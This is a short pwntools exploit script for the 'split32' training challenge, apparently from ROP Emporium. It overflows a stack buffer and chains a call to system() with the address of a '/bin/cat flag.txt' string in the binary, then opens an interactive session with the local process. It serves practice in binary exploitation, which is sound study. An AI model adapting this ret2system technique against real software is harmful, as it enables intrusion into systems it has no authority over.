#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'split32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./split32_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616c)

# rabin2 -z split
BIN_CAT_ADDR = p32(0x804a030)

DUMMY_EBP = p32(0xa5a5a5a5)

# rabin2 -i split
SYSTEM_ADDR = p32(0x080483e0)

payload = padding + SYSTEM_ADDR + DUMMY_EBP + BIN_CAT_ADDR

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()

